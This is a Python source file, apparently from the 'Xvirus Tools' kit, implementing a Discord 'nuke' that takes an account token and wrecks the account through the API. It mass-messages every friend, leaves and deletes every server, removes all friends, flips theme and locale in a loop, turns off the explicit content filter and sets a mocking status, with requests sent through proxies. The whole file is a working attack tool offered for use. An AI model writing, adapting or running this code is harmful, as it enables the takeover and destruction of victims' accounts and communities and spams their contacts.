import random
import threading
from itertools import cycle

import requests
from colorama import Fore

from util.plugins.common import *


def CustomSeizure(token):
    print(f'{Fore.MAGENTA} <*> Starting seizure mode {Fore.WHITE}(Switching on/off Light/dark mode)\n')
    t = threading.currentThread()
    while getattr(t, "do_run", True):
        modes = cycle(["light", "dark"])
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v9/users/@me/settings", proxies={"http": f'{proxy()}'},
                       headers=getheaders(token), json=setting)


def massdmconfig(token, channel_id, content):
    headers = {'Authorization': token}
    try:
        requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages',
                      headers=getheaders(token),
                      data={"content": content})
        print(f"{Fore.RED} <*> Messaged {Fore.BLUE}ID: {channel_id}{Fore.RESET}")
    except Exception as e:
        print(f" <!> The following error has been encountered and is being ignored: {e}")


def leave_guild(token, guild_id):
    try:
        requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{guild_id}',
                        proxies={"http": f'{proxy()}'}, headers=getheaders(token))
        print(f"{Fore.BLUE} <*> Left guild: {Fore.WHITE}{guild_id}{Fore.RESET}")
    except Exception as e:
        print(f" <!> The following error has been encountered and is being ignored: {e}")


def delete_guild(token, guild_id):
    try:
        requests.delete(f'https://discord.com/api/v9/guilds/{guild_id}',
                        proxies={"http": f'{proxy()}'}, headers=getheaders(token))
        print(f'{Fore.RED} <*> Deleted guild: {Fore.WHITE}{guild_id}{Fore.RESET}')
    except Exception as e:
        print(f" <!> The following error has been encountered and is being ignored: {e}")


def remove_friend(token, friend_id):
    try:
        requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{friend_id}',
                        proxies={"http": f'{proxy()}'}, headers=getheaders(token))
        XTitle(f"Removing friend: {friend_id}")
        print(f"{Fore.BLUE} <*> Removed friend: {Fore.WHITE}{friend_id}{Fore.RESET}")
    except Exception as e:
        print(f" <!> The following error has been encountered and is being ignored: {e}")


def Xvirus_Nuke():
    token = input(f'{Fore.RED} <~> Token: {Fore.BLUE}')
    CheckToken(token)
    message_Content = str(input(f'{Fore.RED} <~> Message that will be sent to every friend: {Fore.BLUE}'))

    XTitle("Deploying Xvirus Nuke")
    print(f" Xvirus Nuke Deployed")

    if threading.active_count() <= 100:
        t = threading.Thread(target=CustomSeizure, args=(token,))
        t.start()

    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships",
                             proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
    message_threads = []
    for friend in friendIds:
        t = threading.Thread(target=massdmconfig, args=(token, friend['id'], message_Content))
        message_threads.append(t)
        t.start()

    for t in message_threads:
        t.join()

    guildsIds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=getheaders(token)).json()
    leave_threads = []
    delete_threads = []
    for guild in guildsIds:
        leave_t = threading.Thread(target=leave_guild, args=(token, guild['id']))
        leave_threads.append(leave_t)
        leave_t.start()

        delete_t = threading.Thread(target=delete_guild, args=(token, guild['id']))
        delete_threads.append(delete_t)
        delete_t.start()

    for t in leave_threads:
        t.join()

    for t in delete_threads:
        t.join()

    remove_threads = []
    for friend in friendIds:
        t = threading.Thread(target=remove_friend, args=(token, friend['id']))
        remove_threads.append(t)
        t.start()

    for t in remove_threads:
        t.join()

    requests.delete("https://discord.com/api/v9/hypesquad/online", proxies={"http": f'{proxy()}'},
                    headers=getheaders(token))
    setting = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        "custom_status": {"text": "I got fucked by Xvirus https://xvirus.xyz | https://github.com/Xvirus-Team/Xvirus-Tools"},
        'status': "idle"
    }
    displayname_req = {'global_name': "Nuked By Xvirus Tools"}

    requests.patch("https://discord.com/api/v9/users/@me/settings", proxies={"http": f'{proxy()}'},
                    headers=getheaders(token), json=setting)

    requests.patch('https://discord.com/api/v9/users/@me', 
                    headers=getheaders(token), json=displayname_req)

    j = requests.get("https://discord.com/api/v9/users/@me", proxies={"http": f'{proxy()}'},
                     headers=getheaders(token)).json()
    a = j['username'] + "#" + j['discriminator']
    XTitle(f" Xvirus Nuke Successfully Detonated!")
    print_slow(f" {Fore.BLUE} <*> Successfully turned {a} into a chaotic wasteland ")
    